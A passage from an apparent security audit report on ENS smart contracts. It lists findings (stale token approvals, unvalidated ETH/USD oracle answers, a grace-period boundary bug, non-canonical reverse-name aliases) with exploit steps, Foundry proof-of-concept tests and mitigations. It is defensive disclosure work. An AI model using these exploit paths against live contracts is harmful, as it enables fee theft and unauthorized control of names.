1. A DNS TXT context contains a valid a[60] 20-byte hex payload. 2. _resolveAddress returns abi.encode(address), which is 32 bytes and cannot be decoded as bytes memory by callers of addr(bytes32,uint256). 3. A missing multicoin record returns raw empty bytes instead of abi.encode(bytes()). 4. A valid non-EVM record such as a[0]=0x0014... with a 22-byte payload reverts because hexToAddress only accepts 20-byte addresses. 5. All three cases violate the resolver return ABI and break standard multicoin resolution.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ExtendedDNSResolver} from "../contracts/resolvers/profiles/ExtendedDNSResolver.sol";
import {IExtendedDNSResolver} from "../contracts/resolvers/profiles/IExtendedDNSResolver.sol";
import {IAddressResolver} from "../contracts/resolvers/profiles/IAddressResolver.sol";

contract ExtendedDNSResolverMulticoinAbiPoC is Test {
    ExtendedDNSResolver resolver;

    function setUp() public {
        resolver = new ExtendedDNSResolver();
    }

    function testMulticoinAddrReturnIsNotAbiEncodedBytes() public {
        bytes memory coin60 = abi.encodeWithSelector(IAddressResolver.addr.selector, bytes32(0), uint256(60));
        bytes memory out = resolver.resolve(bytes(""), coin60, bytes("a[60]=0x000000000000000000000000000000000000dEaD"));

        assertEq(out.length, 32);
        (bool decodesAsBytes, ) = address(this).call(abi.encodeWithSelector(this.decodeAsBytes.selector, out));
        assertEq(decodesAsBytes, false);

        bytes memory missing = resolver.resolve(bytes(""), coin60, bytes(""));
        assertEq(abi.encode(bytes("")).length, 64);
        assertEq(missing.length, 0);
    }

    function testValidNonEvmMulticoinRecordReverts() public {
        bytes memory coin0 = abi.encodeWithSelector(IAddressResolver.addr.selector, bytes32(0), uint256(0));
        bytes memory validBtcScript = bytes("a[0]=0x00149010587f8364b964fcaa70687216b53bd2cbd798");

        (bool ok, ) = address(resolver).call(abi.encodeWithSelector(IExtendedDNSResolver.resolve.selector, bytes(""), coin0, validBtcScript));
        assertEq(ok, false);
    }

    function decodeAsBytes(bytes memory blob) external pure returns (bytes memory) {
        return abi.decode(blob, (bytes));
    }
}


## Suggested Mitigation
For _resolveAddress, require and strip a literal 0x prefix, convert value[2:] with HexUtils.hexToBytes, and return abi.encode(parsedBytes). For missing multicoin records return abi.encode(bytes("")); for missing legacy addr records return abi.encode(address(0)). Keep _resolveAddr as the legacy address-only parser, but do not use address ABI for addr(bytes32,uint256).
```

### M-7 / `6a-XhkrZKMLYM7rhTBUe9`
- Finding title: Stale token approvals survive transfers after CANNOT_APPROVE, letting an old approved address extend subnames
- Report lines: 738-784
```md
## [M-7]. Stale token approvals survive transfers after CANNOT_APPROVE, letting an old approved address extend subnames

## id: 6a-XhkrZKMLYM7rhTBUe9

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
NameWrapper._beforeTransfer

## Finding Status: Valid
### Finding Status Justification: The root cause exists in in-scope NameWrapper/ERC1155Fuse code. NameWrapper.approve blocks new approvals once CANNOT_APPROVE is burned. However, NameWrapper._beforeTransfer deletes _tokenApprovals[id] only when CANNOT_APPROVE is not burned, so an approval set before burning CANNOT_APPROVE survives a later transfer. ERC1155Fuse._transfer then updates the owner but does not otherwise clear approvals. Because canExtendSubnames authorizes getApproved(uint256(node)) == addr, the old approved address remains able to call extendExpiry for children under the transferred parent, while the recipient cannot clear that per-token approval through approve because CANNOT_APPROVE makes approve revert. There is no complete safeguard shown that invalidates the stale approval on transfer or excludes approvals from canExtendSubnames. This is current production-scope code, not an accepted documented design risk, does not require a privileged or compromised protocol role, and is not solely victim misuse because normal public approval, fuse, transfer, and extension flows create the stale authority.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
NameWrapper preserves a per-token approval when CANNOT_APPROVE is burned, even though the token is being transferred to a new owner. Vulnerable snippet: if (fuses & CANNOT_APPROVE == 0) { delete _tokenApprovals[id]; }. Because approve() reverts once CANNOT_APPROVE is burned, the recipient cannot clear the stale approval. canExtendSubnames() then treats getApproved(uint256(node)) == addr as authorization, so the old approved address remains authorized to extend subname expiries under the transferred parent.

## Impact
Medium griefing and authorization bypass: a stale approved address can keep extending child name expiries up to the parent expiry after the parent name is sold or transferred, preventing the new owner from letting unwanted subnames expire during the parent validity period.

## Proof of Concept
1. Alice owns a wrapped parent name with PARENT_CANNOT_CONTROL and CANNOT_UNWRAP burned but CANNOT_TRANSFER unburned. 2. Alice approves Extender for the token. 3. Alice burns CANNOT_APPROVE. 4. Alice transfers the wrapped name to Bob. 5. _beforeTransfer does not delete _tokenApprovals[tokenId] because CANNOT_APPROVE is burned. 6. Bob cannot clear the approval because approve() reverts. 7. Extender continues satisfying canExtendSubnames(parentNode, Extender) and can extend children without Bob's consent.

## Proof of Code
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import {NameWrapper} from "../contracts/wrapper/NameWrapper.sol";
import {ENS} from "../contracts/registry/ENS.sol";
import {IBaseRegistrar} from "../contracts/ethregistrar/IBaseRegistrar.sol";
import {IMetadataService} from "../contracts/wrapper/IMetadataService.sol";
import {PARENT_CANNOT_CONTROL,CANNOT_UNWRAP,CANNOT_APPROVE} from "../contracts/wrapper/INameWrapper.sol";
contract MockENS { mapping(bytes32 => address) public owners; function setOwnerRaw(bytes32 node, address owner) external { owners[node] = owner; } function owner(bytes32 node) external view returns (address) { return owners[node]; } }
contract MockReverseRegistrar { function claim(address) external pure returns (bytes32) { return bytes32(0); } }
contract MockMetadata is IMetadataService { function uri(uint256) external pure returns (string memory) { return ""; } }
contract Empty {}
contract Harness is NameWrapper { constructor(ENS ens_, IBaseRegistrar registrar_, IMetadataService metadata_) NameWrapper(ens_, registrar_, metadata_) {} function setDataRaw(bytes32 node, address owner, uint32 fuses, uint64 expiry) external { _setData(node, owner, fuses, expiry); } }
contract StaleApprovalPoC is Test { bytes32 constant ADDR_REVERSE_NODE = 0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2; function deployWrapper() internal returns (Harness h) { MockENS ens = new MockENS(); MockReverseRegistrar reverse = new MockReverseRegistrar(); ens.setOwnerRaw(ADDR_REVERSE_NODE, address(reverse)); h = new Harness(ENS(address(ens)), IBaseRegistrar(address(new Empty())), new MockMetadata()); } function test_staleApprovalCanStillExtendSubnamesAfterTransfer() public { Harness h = deployWrapper(); bytes32 parent = keccak256("parent.eth"); uint256 id = uint256(parent); address alice = address(0xA11CE); address bob = address(0xB0B); address extender = address(0xE77E); uint64 expiry = uint64(block.timestamp + 365 days); h.setDataRaw(parent, alice, uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP), expiry); vm.prank(alice); h.approve(extender, id); h.setDataRaw(parent, alice, uint32(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_APPROVE), expiry); vm.prank(alice); h.safeTransferFrom(alice, bob, id, 1, ""); assertEq(h.ownerOf(id), bob); assertEq(h.getApproved(id), extender); assertTrue(h.canExtendSubnames(parent, extender)); } }

## Suggested Mitigation
Always clear _tokenApprovals[id] on any transfer, regardless of CANNOT_APPROVE. CANNOT_APPROVE should block setting new approvals, not preserve pre-existing approvals across ownership changes.
```

### H-8 / `BCFvJ221KeZUhP6VU5eBq`
- Finding title: Stale or invalid ETH/USD oracle answers can underprice ENS registration and renewal fees
- Report lines: 785-830
```md
## [H-8]. Stale or invalid ETH/USD oracle answers can underprice ENS registration and renewal fees

## id: BCFvJ221KeZUhP6VU5eBq

## Derived From Pattern/Invariant
StaleOracleAcceptance / OracleUsingDEXorTWAP

## Exploit Type
Oracle

## Location
StablePriceOracle.attoUSDToWei

## Finding Status: Valid
### Finding Status Justification: The described root cause is present in production Solidity code used by the in-scope ExponentialPremiumPriceOracle. StablePriceOracle.price() computes both base and premium prices through attoUSDToWei(), and ExponentialPremiumPriceOracle inherits this path for registrar pricing. attoUSDToWei() directly reads usdOracle.latestAnswer(), casts the signed answer to uint256, and divides by it. There is no check that the answer is positive, nonzero, fresh, from a completed round, or within bounds. The provided AggregatorInterface exposes only latestAnswer(), so the contract has no timestamp or round-data validation safeguard. A stale high ETH/USD answer mechanically lowers the wei-denominated registration or renewal price because amount * 1e8 is divided by the stale high price. A negative oracle answer is also not rejected before the explicit int256-to-uint256 conversion, which can produce a very large denominator and make ordinary prices round to zero. The affected pricing path is in analyzed smart-contract source and directly impacts .eth registration, renewal, and premium fee calculations. No documentation provided clearly accepts stale or negative oracle pricing as intentional behavior. Exploitation does not require admin privileges, leaked keys, or victim misuse; a permissionless registrant can use the normal controller/pricing flow once the oracle returns such an answer. The root cause exists in today’s code rather than depending on a future integration, although the stale/invalid oracle condition is an external precondition.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
StablePriceOracle.attoUSDToWei() trusts AggregatorInterface.latestAnswer() without checking that the answer is positive or fresh. ExponentialPremiumPriceOracle.price() inherits this conversion for both base and premium fees, so a stale high ETH/USD answer undercharges registrations/renewals, and a negative answer is cast to uint256 and can make normal prices round to zero.

Vulnerable snippet:
function attoUSDToWei(uint256 amount) internal view returns (uint256) {
    uint256 ethPrice = uint256(usdOracle.latestAnswer());
    return (amount * 1e8) / ethPrice;
}

## Impact
The registrar can accept materially underpriced registration or renewal payments when the feed is stale above the real ETH/USD price, causing theft of registration fees/treasury revenue. If the feed returns a negative value, normal prices can round to zero wei after the unchecked int256-to-uint256 cast.

## Proof of Concept
1. ETH/USD oracle last reports 4000e8 and then stops updating. 2. ETH later trades at 1000e8, but latestAnswer() still returns the stale 4000e8 value. 3. A permissionless registrant calls the controller path that queries ExponentialPremiumPriceOracle.price(). 4. attoUSDToWei() divides by 4000e8 instead of rejecting the stale round, so the required ETH is roughly one quarter of the correct fee. 5. The user registers/renews while the treasury receives less than the configured USD price.

## Proof of Code
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "../contracts/ethregistrar/ExponentialPremiumPriceOracle.sol";
import "../contracts/ethregistrar/IPriceOracle.sol";
contract MockAggregator is AggregatorInterface { int256 public answer; constructor(int256 a) { answer = a; } function setAnswer(int256 a) external { answer = a; } function latestAnswer() external view returns (int256) { return answer; } }
contract OracleValidationPoC is Test { function _oracle(int256 answer) internal returns (ExponentialPremiumPriceOracle oracle, MockAggregator feed) { feed = new MockAggregator(answer); uint256[] memory prices = new uint256[](5); prices[0] = 1000e18; prices[1] = 500e18; prices[2] = 100e18; prices[3] = 50e18; prices[4] = 10e18; oracle = new ExponentialPremiumPriceOracle(feed, prices, 100e18, 28); } function testStaleHighAnswerUnderchargesRegistrationFee() public { (ExponentialPremiumPriceOracle oracle, MockAggregator feed) = _oracle(4000e8); IPriceOracle.Price memory stalePrice = oracle.price("abcde", 0, 365 days); vm.warp(block.timestamp + 30 days); IPriceOracle.Price memory stillAcceptedStalePrice = oracle.price("abcde", 0, 365 days); assertEq(stillAcceptedStalePrice.base, stalePrice.base); feed.setAnswer(1000e8); IPriceOracle.Price memory correctFreshPrice = oracle.price("abcde", 0, 365 days); assertGt(correctFreshPrice.base, stillAcceptedStalePrice.base * 3); } function testNegativeAnswerRoundsNormalFeeToZero() public { (ExponentialPremiumPriceOracle oracle,) = _oracle(-1); IPriceOracle.Price memory p = oracle.price("abcde", 0, 365 days); assertEq(p.base, 0); } }

## Suggested Mitigation
Use AggregatorV3Interface.latestRoundData() and validate answer > 0, updatedAt != 0, block.timestamp - updatedAt <= heartbeat, and answeredInRound >= roundId before conversion. Revert on invalid/stale answers and consider min/max price circuit breakers.
```

### M-9 / `lVVCkIB8v6NnxPXfbcKu2`
- Finding title: Strict less-than grace-period checks let expired .eth names be transferred at the registrar expiry timestamp
- Report lines: 831-877
```md
## [M-9]. Strict less-than grace-period checks let expired .eth names be transferred at the registrar expiry timestamp

## id: lVVCkIB8v6NnxPXfbcKu2

## Derived From Pattern/Invariant
TimestampOrBlockManipulation

## Exploit Type
TimestampDependentLogic

## Location
NameWrapper._isETH2LDInGracePeriod

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in in-scope production code. NameWrapper stores .eth wrapper expiry as registrarExpiry + GRACE_PERIOD, and _isETH2LDInGracePeriod checks expiry - GRACE_PERIOD < block.timestamp. At block.timestamp == registrarExpiry this evaluates false, so canModifyName still authorizes the wrapped owner/operator. _beforeTransfer similarly subtracts GRACE_PERIOD and only treats the name as expired when registrarExpiry < block.timestamp, so a transfer is not blocked at equality unless CANNOT_TRANSFER is burned. BaseRegistrarImplementation.ownerOf uses expiries[tokenId] > block.timestamp, so the registrar already treats the same name as expired at equality. No complete safeguard in the provided code closes this exact equality gap. The path is in NameWrapper.sol, listed in scope, and does not require admin, leaked keys, or victim misuse; it requires a stale wrapped owner/operator using public wrapper permissions at the boundary timestamp. The behavior is not explicitly documented as an accepted risk and is present in current code, not dependent on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The wrapper intends .eth 2LDs to enter grace-period restrictions when registrar expiry is reached, but both grace checks use strict less-than comparisons. Vulnerable snippets: expiry - GRACE_PERIOD < block.timestamp in _isETH2LDInGracePeriod and if (expiry < block.timestamp) after subtracting GRACE_PERIOD in _beforeTransfer. At block.timestamp == registrar.nameExpires(labelhash), the registrar considers the name expired, but NameWrapper still lets the stale wrapped owner modify or transfer the wrapped token.

## Impact
Medium griefing and unauthorized state change: at the first grace-period timestamp, a stale owner or already-approved operator can transfer or mutate an expired wrapped .eth name. If the name is later renewed, the wrapper preserves the attacker-chosen owner set during the boundary transaction.

## Proof of Concept
1. A .eth 2LD is wrapped with wrapper expiry equal to registrarExpiry + GRACE_PERIOD. 2. Time reaches exactly registrarExpiry. 3. registrar.ownerOf(tokenId) would now revert because BaseRegistrarImplementation requires expiries[tokenId] > block.timestamp. 4. NameWrapper.canModifyName still returns true because registrarExpiry < block.timestamp is false at equality. 5. _beforeTransfer also treats the name as not expired because registrarExpiry < block.timestamp is false. 6. The stale wrapped owner or operator transfers the expired wrapper token before grace-period restrictions begin one second later.

## Proof of Code
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import {NameWrapper} from "../contracts/wrapper/NameWrapper.sol";
import {ENS} from "../contracts/registry/ENS.sol";
import {IBaseRegistrar} from "../contracts/ethregistrar/IBaseRegistrar.sol";
import {IMetadataService} from "../contracts/wrapper/IMetadataService.sol";
import {PARENT_CANNOT_CONTROL,IS_DOT_ETH} from "../contracts/wrapper/INameWrapper.sol";
contract MockENS { mapping(bytes32 => address) public owners; function setOwnerRaw(bytes32 node, address owner) external { owners[node] = owner; } function owner(bytes32 node) external view returns (address) { return owners[node]; } }
contract MockReverseRegistrar { function claim(address) external pure returns (bytes32) { return bytes32(0); } }
contract MockMetadata is IMetadataService { function uri(uint256) external pure returns (string memory) { return ""; } }
contract Empty {}
contract Harness is NameWrapper { constructor(ENS ens_, IBaseRegistrar registrar_, IMetadataService metadata_) NameWrapper(ens_, registrar_, metadata_) {} function setDataRaw(bytes32 node, address owner, uint32 fuses, uint64 expiry) external { _setData(node, owner, fuses, expiry); } }
contract GraceBoundaryPoC is Test { bytes32 constant ADDR_REVERSE_NODE = 0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2; function deployWrapper() internal returns (Harness h) { MockENS ens = new MockENS(); MockReverseRegistrar reverse = new MockReverseRegistrar(); ens.setOwnerRaw(ADDR_REVERSE_NODE, address(reverse)); h = new Harness(ENS(address(ens)), IBaseRegistrar(address(new Empty())), new MockMetadata()); } function test_transferAllowedExactlyAtRegistrarExpiry() public { Harness h = deployWrapper(); bytes32 node = keccak256("expired.eth"); uint256 id = uint256(node); address alice = address(0xA11CE); address bob = address(0xB0B); uint64 registrarExpiry = uint64(block.timestamp + 10 days); uint64 wrapperExpiry = registrarExpiry + 90 days; h.setDataRaw(node, alice, uint32(PARENT_CANNOT_CONTROL | IS_DOT_ETH), wrapperExpiry); vm.warp(registrarExpiry); assertTrue(h.canModifyName(node, alice)); vm.prank(alice); h.safeTransferFrom(alice, bob, id, 1, ""); assertEq(h.ownerOf(id), bob); vm.warp(registrarExpiry + 1); assertFalse(h.canModifyName(node, bob)); } }

## Suggested Mitigation
Use inclusive grace-period checks. _isETH2LDInGracePeriod should return true when expiry - GRACE_PERIOD <= block.timestamp, and _beforeTransfer should treat .eth 2LDs as expired when registrarExpiry <= block.timestamp.
```

### L-10 / `trbxeQBTMBIC-ALIGbQLF`
- Finding title: ETH reverse resolver returns addr.reverse registrar for unrelated reverse namespaces
- Report lines: 878-947
```md
## [L-10]. ETH reverse resolver returns addr.reverse registrar for unrelated reverse namespaces

## id: trbxeQBTMBIC-ALIGbQLF

## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
AbstractReverseResolver.resolve

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in in-scope production code: AbstractReverseResolver.resolve handles the legacy IAddrResolver.addr selector by calling ENSIP19.parseNamespace(name, 0), checking only the boolean valid result, and discarding the parsed namespace coin type. It then returns chainRegistrar whenever the resolver instance has coinType == COIN_TYPE_ETH. ENSIP19.parseNamespace accepts addr.reverse, default.reverse, and hex coin-type namespaces, so an ETHReverseResolver instance can return the addr.reverse registrar for any valid reverse namespace rather than only the ETH namespace. The multicoin addr(bytes32,uint256) branch compares the requested coin type from calldata, but that safeguard is not present in the legacy branch and does not block this exact path. The file is explicitly in audit scope. The comments say addr(*) should apply when name is a namespace for coinType, which supports the finding rather than documenting this behavior as accepted. The call is external view and permissionless, so it is currently reachable without privileged access, victim misuse, or future protocol changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The legacy addr(bytes32) profile validates that `name` is some valid ENSIP-19 reverse namespace, but discards the parsed coin type. For any concrete resolver deployed with `coinType == COIN_TYPE_ETH`, this makes `resolve(default.reverse, addr(bytes32))` and `resolve(<otherCoin>.reverse, addr(bytes32))` return the ETH `chainRegistrar` instead of returning address(0) or rejecting the namespace.

Vulnerable snippet:
`(bool valid, ) = ENSIP19.parseNamespace(name, 0); if (!valid) revert UnreachableName(name); return abi.encode(coinType == COIN_TYPE_ETH ? chainRegistrar : address(0));`

The multicoin `addr(bytes32,uint256)` branch correctly decodes and compares the requested coin type, but the legacy branch does not, so namespace discovery is not scoped to the namespace being queried.

## Impact
Resolver clients can be misled into treating the ETH reverse registrar as authoritative for non-ETH reverse namespaces. This is an identity/resolution integrity violation and can cause incorrect reverse registrar discovery, but it does not directly steal or freeze ENS names or funds.

## Proof of Concept
1. Deploy a concrete ETH reverse resolver with `coinType == COIN_TYPE_ETH` and `chainRegistrar == addrReverseRegistrar`.
2. Encode `default.reverse` or `80000089.reverse` as a DNS-encoded ENSIP-19 namespace.
3. Call `resolve(encodedNamespace, abi.encodeWithSelector(IAddrResolver.addr.selector, bytes32(0)))`.
4. Observe that the resolver returns `addrReverseRegistrar` even though the queried namespace is not `addr.reverse`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {AbstractReverseResolver} from "../contracts/reverseResolver/AbstractReverseResolver.sol";
import {IAddrResolver} from "../contracts/resolvers/profiles/IAddrResolver.sol";
import {COIN_TYPE_ETH} from "../contracts/utils/ENSIP19.sol";

contract HarnessResolver is AbstractReverseResolver {
    constructor(address registrar) AbstractReverseResolver(COIN_TYPE_ETH, registrar) {}
    function _resolveName(address) internal pure override returns (string memory) { return ""; }
    function resolveNames(address[] memory addrs) external pure returns (string[] memory names) { names = new string[](addrs.length); }
}

contract AbstractReverseResolverNamespaceTest is Test {
    function dns(string memory a, string memory b) internal pure returns (bytes memory) {
        return abi.encodePacked(bytes1(uint8(bytes(a).length)), a, bytes1(uint8(bytes(b).length)), b, hex"00");
    }

    function testLegacyAddrReturnsEthRegistrarForDefaultNamespace() public {
        address registrar = address(0xBEEF);
        HarnessResolver resolver = new HarnessResolver(registrar);
        bytes memory name = dns("default", "reverse");
        bytes memory ret = resolver.resolve(name, abi.encodeWithSelector(IAddrResolver.addr.selector, bytes32(0)));
        address returnedRegistrar = abi.decode(ret, (address));
        assertEq(returnedRegistrar, registrar);
    }
}

## Suggested Mitigation
Use the parsed namespace coin type in the legacy addr branch and only return the registrar when the requested namespace is the ETH reverse namespace: `(bool valid, uint256 parsedCt) = ENSIP19.parseNamespace(name, 0); if (!valid) revert UnreachableName(name); return abi.encode(parsedCt == COIN_TYPE_ETH && coinType == COIN_TYPE_ETH ? chainRegistrar : address(0));`.
```

### L-11 / `BDPZ_5wcfnzQUS0E-X5fl`
- Finding title: Odd-length reverse labels resolve as aliases for canonical EVM addresses
- Report lines: 948-1021
```md
## [L-11]. Odd-length reverse labels resolve as aliases for canonical EVM addresses

## id: BDPZ_5wcfnzQUS0E-X5fl

## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
AbstractReverseResolver.resolve

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in AbstractReverseResolver.resolve for the INameResolver.name selector. It calls ENSIP19.parse(name), then only requires the decoded address byte array to have length 20 and the parsed coin type to match the resolver policy. ENSIP19.parse decodes the first label using HexUtils.hexToBytes rather than HexUtils.hexToAddress. HexUtils.hexToBytes intentionally rounds odd nibble counts up and pads the leading nibble, so a 39-character hex label can decode to 20 bytes. For an address whose canonical 40-character hex label starts with a zero nibble, removing that zero produces a non-canonical 39-character label that decodes to the same 20-byte address and reaches _resolveName. There is no canonical label-length check in this branch. The affected AbstractReverseResolver/ETHReverseResolver/DefaultReverseResolver code is in scoped production reverse-resolver code. No documentation in the supplied material explicitly accepts non-canonical aliases as intentional behavior. The path is external view and permissionless, requiring only a crafted DNS-encoded name, not privileged access, user error, or future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The name() profile accepts any parsed address bytes with length 20, but `ENSIP19.parse()` delegates address decoding to `HexUtils.hexToBytes()`, which intentionally accepts odd-length hex strings by left-padding the leading nibble. As a result, a non-canonical 39-nibble label can resolve to the same 20-byte address as the canonical 40-nibble ENSIP-19 reverse label when the canonical address begins with a zero nibble.

Vulnerable snippet:
`(bytes memory a, uint256 ct) = ENSIP19.parse(name); if (a.length != 20 || !(...)) revert UnreachableName(name); address addr = address(bytes20(a)); return abi.encode(_resolveName(addr));`

`HexUtils.hexToBytes()` allocates `(1 + nibbles) >> 1` bytes and pads odd nibble counts, so the resolver never enforces the canonical 40-hex-character encoding expected for EVM address reverse names.

## Impact
Malformed reverse names can resolve to legitimate address identities, creating non-canonical aliases for the same account. This weakens reverse-resolution integrity and can break clients that assume ENSIP-19 reverse names are canonical, but it does not directly transfer, mint, or freeze ENS assets.

## Proof of Concept
1. Deploy a concrete reverse resolver for `COIN_TYPE_ETH` whose `_resolveName()` returns a fixed name for the parsed address.
2. Pick an address with a leading zero nibble, for example `0x0123456789012345678901234567890123456789`.
3. Query `resolve()` with the canonical DNS name `0123456789012345678901234567890123456789.addr.reverse` and selector `name(bytes32)`.
4. Query `resolve()` with the non-canonical DNS name `123456789012345678901234567890123456789.addr.reverse` and the same selector.
5. Both calls return the same resolved name instead of the non-canonical name reverting with `UnreachableName`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {AbstractReverseResolver} from "../contracts/reverseResolver/AbstractReverseResolver.sol";
import {INameResolver} from "../contracts/resolvers/profiles/INameResolver.sol";
import {COIN_TYPE_ETH} from "../contracts/utils/ENSIP19.sol";

contract AliasHarnessResolver is AbstractReverseResolver {
    address public last;
    constructor() AbstractReverseResolver(COIN_TYPE_ETH, address(0xBEEF)) {}
    function _resolveName(address addr) internal view override returns (string memory) {
        addr;
        return "alice.eth";
    }
    function resolveNames(address[] memory addrs) external pure returns (string[] memory names) { names = new string[](addrs.length); }
}

contract AbstractReverseResolverCanonicalTest is Test {
    function dns3(string memory a, string memory b, string memory c) internal pure returns (bytes memory) {
        return abi.encodePacked(bytes1(uint8(bytes(a).length)), a, bytes1(uint8(bytes(b).length)), b, bytes1(uint8(bytes(c).length)), c, hex"00");
    }

    function testOddLengthAddressLabelResolvesInsteadOfReverting() public {
        AliasHarnessResolver resolver = new AliasHarnessResolver();
        bytes memory nonCanonical = dns3("123456789012345678901234567890123456789", "addr", "reverse");
        bytes memory ret = resolver.resolve(nonCanonical, abi.encodeWithSelector(INameResolver.name.selector, bytes32(0)));
        string memory resolved = abi.decode(ret, (string));
        assertEq(resolved, "alice.eth");
    }
}

## Suggested Mitigation
For EVM reverse-name resolution, require canonical address-label length before accepting the parsed bytes. For example, either parse the first label with `HexUtils.hexToAddress()` so exactly 40 hex characters are required, or make `ENSIP19.parse()` expose the original label length and require `labelLength == 40` when resolving EVM coin types.
```

### M-12 / `DRKsNuQtFB8DiYxxNr00-`
- Finding title: Non-canonical 39-nibble reverse labels resolve to canonical address names in DefaultReverseResolver.resolve
- Report lines: 1022-1113
```md
## [M-12]. Non-canonical 39-nibble reverse labels resolve to canonical address names in DefaultReverseResolver.resolve

## id: DRKsNuQtFB8DiYxxNr00-

## Derived From Pattern/Invariant
StandardViolation: ENSIP-19 reverse names must be canonical one-to-one encodings of exactly one 20-byte EVM address

## Exploit Type
StandardViolation

## Location
DefaultReverseResolver.resolve

## Finding Status: Valid
### Finding Status Justification: The described path exists in production scoped code: DefaultReverseResolver inherits AbstractReverseResolver.resolve(), whose name() branch calls ENSIP19.parse(name), only checks a.length == 20 and an acceptable EVM coin type, then casts bytes20(a) to an address and calls _resolveName(). ENSIP19.parse obtains the first DNS label bytes using HexUtils.hexToBytes(name, 1, offset). HexUtils.hexToBytes allocates (1 + nibbles) >> 1 bytes and unsafeBytes explicitly pads odd nibble counts as a leading half-byte, so a 39-hex-character label decodes to 20 bytes and can match the canonical address with a leading zero nibble. There is no exact 40-character label-length check, no canonical re-encoding comparison, and no use of hexToAddress() in this path. The behavior is not clearly documented as accepted; ENSIP19.reverseName generates canonical hex and the resolver comment says ENSIP-19 reverse name, but does not accept this aliasing risk by design. The issue is currently reachable by a permissionless resolve() call with crafted DNS-encoded input, without privileged access, leaked credentials, or pure victim misuse. It is not dependent on a future integration or upgrade.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
DefaultReverseResolver inherits AbstractReverseResolver.resolve(), which accepts any parsed address bytes with length 20. ENSIP19.parse() obtains those bytes via HexUtils.hexToBytes(), and HexUtils.hexToBytes() rounds odd-length hex strings up by padding the leading nibble. As a result, a 39-hex-character first DNS label such as 123456789abcdef0123456789abcdef01234567 decodes to the same 20-byte address as the canonical 40-character label 0123456789abcdef0123456789abcdef01234567 and passes the only length check.

Vulnerable snippet:
(bytes memory a, uint256 ct) = ENSIP19.parse(name);
if (a.length != 20 || !(coinType == COIN_TYPE_DEFAULT ? ENSIP19.isEVMCoinType(ct) : ct == coinType)) {
    revert UnreachableName(name);
}
address addr = address(bytes20(a));
return abi.encode(_resolveName(addr));

The parser path that makes this possible is:
(addressBytes, valid) = HexUtils.hexToBytes(name, 1, offset);
// HexUtils.hexToBytes allocates new bytes((1 + nibbles) >> 1), so 39 nibbles becomes 20 bytes.

## Impact
Reverse-resolution canonicality is broken: multiple DNS/textual reverse names can resolve to the same address record. This can grief or mislead integrations that rely on ENSIP-19 reverse names being a canonical one-to-one namespace, causing non-canonical aliases to be accepted instead of rejected.

## Proof of Concept
1. Deploy DefaultReverseResolver with a registrar that returns alice.eth for address 0x0123456789abcdef0123456789abcdef01234567.
2. Query resolve() for the non-canonical DNS name whose first label is the 39-nibble alias 123456789abcdef0123456789abcdef01234567.default.reverse.
3. The call should revert because the address label is not the canonical 40-hex-character ENSIP-19 encoding.
4. Instead, HexUtils pads the leading nibble, the decoded bytes length is 20, and resolve() returns alice.eth.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test} from 'forge-std/Test.sol';
import {DefaultReverseResolver} from '../contracts/reverseResolver/DefaultReverseResolver.sol';
import {IStandaloneReverseRegistrar} from '../contracts/reverseRegistrar/IStandaloneReverseRegistrar.sol';
import {INameResolver} from '../contracts/resolvers/profiles/INameResolver.sol';

contract MockRegistrar is IStandaloneReverseRegistrar {
    mapping(address => string) internal names;

    function setName(address addr, string memory name) external {
        names[addr] = name;
    }

    function nameForAddr(address addr) external view returns (string memory) {
        return names[addr];
    }
}

contract DefaultReverseResolverCanonicalityPoC is Test {
    MockRegistrar registrar;
    DefaultReverseResolver resolver;

    function setUp() public {
        registrar = new MockRegistrar();
        resolver = new DefaultReverseResolver(registrar);
    }

    function _reverseName(string memory label) internal pure returns (bytes memory) {
        return abi.encodePacked(bytes1(uint8(bytes(label).length)), bytes(label), bytes1(uint8(7)), bytes('default'), bytes1(uint8(7)), bytes('reverse'), bytes1(0));
    }

    function testNonCanonicalOddLengthAddressLabelResolves() public {
        address victim = 0x0123456789abcdef0123456789abcdef01234567;
        registrar.setName(victim, 'alice.eth');

        bytes memory data = abi.encodeCall(INameResolver.name, (bytes32(0)));
        bytes memory ret = resolver.resolve(_reverseName('123456789abcdef0123456789abcdef01234567'), data);

        assertEq(abi.decode(ret, (string)), 'alice.eth');
    }
}

## Suggested Mitigation
Reject non-canonical EVM address labels before decoding. For EVM reverse names, require the first DNS label to be exactly 40 hex characters and optionally compare it against HexUtils.addressToHex(address(bytes20(a))) after decoding. Alternatively, parse EVM address labels with HexUtils.hexToAddress(), which already enforces exactly 40 hex characters.
```

### M-13 / `B80Sn7wWoAV__-X9emW1F`
- Finding title: Default registrar is returned for unrelated reverse namespaces in DefaultReverseResolver.resolve
- Report lines: 1114-1197
```md
## [M-13]. Default registrar is returned for unrelated reverse namespaces in DefaultReverseResolver.resolve

## id: B80Sn7wWoAV__-X9emW1F

## Derived From Pattern/Invariant
StandardViolation: addr(bytes32,uint256) registrar discovery must be scoped to the queried ENSIP-19 reverse namespace

## Exploit Type
StandardViolation

## Location
DefaultReverseResolver.resolve

